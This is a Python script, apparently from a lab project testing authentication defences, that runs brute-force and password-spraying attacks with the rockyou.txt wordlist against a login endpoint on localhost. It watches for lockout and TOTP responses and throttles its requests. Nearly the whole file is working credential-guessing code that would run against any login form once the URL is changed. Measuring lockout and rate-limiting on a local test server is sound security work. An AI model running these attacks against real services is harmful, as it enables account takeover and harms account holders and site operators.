import requests
import random
import os   
import time
from config_loader import load_config
from server_monitor import run_with_server_monitoring, print_attack_summary
usernames = []
MAX_RUNTIME_SECONDS = 2*60*60  # 2 hours
SUCCESS_LOGIN_MESSAGE = "Login successful!" # Message indicating a successful login
PERMA_LOCKOUT_MESSAGE = "Error: Account is currently locked, please ask the administrator to unlock it."
TEMP_LOCKOUT_MESSAGE = "Account is temporarily locked due to too many login attempts. Please try again later."
TOTP_REQUIRED_MESSAGE = "Please enter your authentication code"

config = load_config()

RATE_LIMITING_TIME_SECONDS = config.get("rate_limiting", {}).get("lockout_duration_seconds", 5)  # Time to wait on temporary lockout

# Define the path to the rockyou.txt password list
passwords_path = os.path.join("rockyou","rockyou.txt")

# -----------------------------------------------------------------------------
# Attack implementations
# -----------------------------------------------------------------------------

def brute_force(username):
    """Performs a brute-force attack on the given username using a list of common passwords."""

    line_counter = 0 # Count how many password attempts were made
    url = "http://127.0.0.1:5000/login" # Define the target URL for login attempts
    session = requests.Session() #  Reuse the same Session for efficiency
    last_status = None # Store the last HTTP status code received
    MAX_ATTEMPTS = 50000 # Limit the number of attempts for brute-force
    response = None
    last_status = None
    SLOW_DOWN_SESSION_EVERY_N_ATTEMPTS = 100 
    SLOW_DOWN_TIME = 0.8  # Time to sleep when slowing down the session

    print(f"Starting brute-force attack on user: {username}")
    start_time = time.perf_counter()
    try:
        # Read passwords from the rockyou.txt file and try them one by one
        with open(passwords_path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                if time_limit_reached(start_time, MAX_RUNTIME_SECONDS):
                    print("Time limit reached for brute-force attack.")
                    break

                # Check if maximum attempts reached 
                if line_counter >= MAX_ATTEMPTS:
                    print("Reached maximum attempts for brute-force.")
                    break
                
                line_counter += 1
                password = line.strip() 
                print(f"{line_counter}) Trying password: {password}")

                response = send_request(session, url, username, password) # Send the login attempt

                # Read the response data from the server
                text = response.text
                last_status = response.status_code
                response.close()

                # Check for successful login
                if SUCCESS_LOGIN_MESSAGE in text:
                    print(f"Password found: '{password}', for user: '{username}', on try number: {line_counter}")
                    break

                if PERMA_LOCKOUT_MESSAGE in text:
                    print(f"{username} Account locked out after {line_counter} attempts.")
                    break

                if TEMP_LOCKOUT_MESSAGE in text:
                    print(f"Account temporarily locked out after {line_counter} attempts.")
                    time.sleep(RATE_LIMITING_TIME_SECONDS)  # Simulating that the account is temporary locked
                
                if TOTP_REQUIRED_MESSAGE in text:
                    print(f"TOTP required for user '{username}' after {line_counter} attempts. Stopping brute-force.")
                    break

                #  Slow down the session to avoid server overload
                if line_counter % SLOW_DOWN_SESSION_EVERY_N_ATTEMPTS == 0:
                    time.sleep(SLOW_DOWN_TIME)

        # Print the last status code received
        if last_status is not None:
            print("Status:", last_status) 

        return line_counter  # Return the number of attempts made in total
    finally:
        # Ensure the session is closed after the attack
        session.close()


def password_spraying():
    print("Password spraying attack not yet implemented.")
    line_counter = 1
    try_counter = 1
    found_password = False
    time_passed = False
    response = None
    last_status = None
    finish_flag = False
    session = requests.Session() #  Reuse the same Session for efficiency
    NUM_PASSWORDS_TO_TRY = 150  # Limit the number of passwords to try
    SLOW_DOWN_SESSION_EVERY_N_ATTEMPTS = 100 
    SLOW_DOWN_TIME = 0.8  # Time to sleep when slowing down the session
    users_locked_count = 0

    # Define the target URL for login attempts
    url = "http://127.0.0.1:5000/login"

    print(f"Starting password spraying attack on user:")
    start_time = time.perf_counter()
    try: 
        # Read passwords from the rockyou.txt file and try them one by one
        with open(passwords_path) as f:
                for line in f:
                    password = line.strip()
                    
                    for attacked_username in usernames:
                        if time_limit_reached(start_time, MAX_RUNTIME_SECONDS):
                            print("Time limit reached for brute-force attack.")
                            time_passed = True
                            break

                        # Read the server response
                        response = send_request(session, url, attacked_username, password)
                        text = response.text
                        last_status = response.status_code
                        response.close()

                        print(f"{try_counter}) Trying password: {password} for user: {attacked_username}")

                        if  SUCCESS_LOGIN_MESSAGE in text:
                            print(f"Password found: '{password}', for user: '{attacked_username}', on try number: {try_counter}")
                            found_password = True
                            break 
                        
                        elif PERMA_LOCKOUT_MESSAGE in text:
                            print(f"{attacked_username} Account locked permanantly after {line_counter} attempts.")
                            users_locked_count += 1
                            if users_locked_count >= len(usernames):
                                print("-----------------------\nAll user accounts are permanently locked. Ending attack.\n-------------------")
                                finish_flag = True
                                break

                        elif TEMP_LOCKOUT_MESSAGE in text:
                            print(f"Account temporarily locked after {line_counter} attempts.")
                            time.sleep(RATE_LIMITING_TIME_SECONDS)  # Wait before continuing

                        if try_counter % SLOW_DOWN_SESSION_EVERY_N_ATTEMPTS == 0:
                            time.sleep(SLOW_DOWN_TIME)

                        try_counter += 1
                    if finish_flag:
                        break
                    line_counter += 1
                    if time_passed or found_password:
                        break
                    if line_counter > NUM_PASSWORDS_TO_TRY:
                        print("Reached maximum number of attempts for password spraying.")
                        break

        if last_status is not None:
            print("Status:", last_status)

        return try_counter  # Return the number of attempts made

    finally:
        # Ensure the session is closed after the attack
        session.close()

# -----------------------------------------------------------------------------
# Helper functions
# -----------------------------------------------------------------------------
def send_request(session,url, username, password):
    """Sends a login attempt to the server using the provided Session, username, and password."""
    payload = { "username": username, "password": password }
    return session.post(url, data=payload, timeout=30)

def time_limit_reached(start_time, limit_seconds):
    """Checks if the time limit has been reached."""
    return (time.perf_counter() - start_time) >= limit_seconds


# -----------------------------------------------------------------------------
# Main attack execution logic
# -----------------------------------------------------------------------------  

def execute_user_attack(choice):
    """Executes the selected attack mode with server monitoring."""
    print(f"Executing attack mode: {choice}")
    if choice == "brute_force":
        attacked_username = config.get("attacked_username")
        print(f"Attacked username from config: {attacked_username}")

        if attacked_username not in usernames:
            print("Invalid choice. Closing the program.")
            exit()

        def attack_func():
            return brute_force(attacked_username)
        
        result = run_with_server_monitoring(attack_func, sample_interval=0.5)
        print_attack_summary(result)
        
        
    elif choice == "password_spraying":
        def attack_func():
            return password_spraying()

        result = run_with_server_monitoring(attack_func, sample_interval=0.5)
        print_attack_summary(result)
        
    else:
        raise ValueError("Invalid attack choice.")


# -----------------------------------------------------------------------------
# Main execution
# -----------------------------------------------------------------------------  

# Load usernames from a file
with open("usernames.txt") as f:
  for line in f:
    usernames.append(line.strip())

# Select a random username for testing
random_user = random.choice(usernames)

config = load_config()
user_attack_choice = config.get("attack_mode", "brute_force") # Read attack mode from config - brute_force or password_spraying

execute_user_attack(user_attack_choice)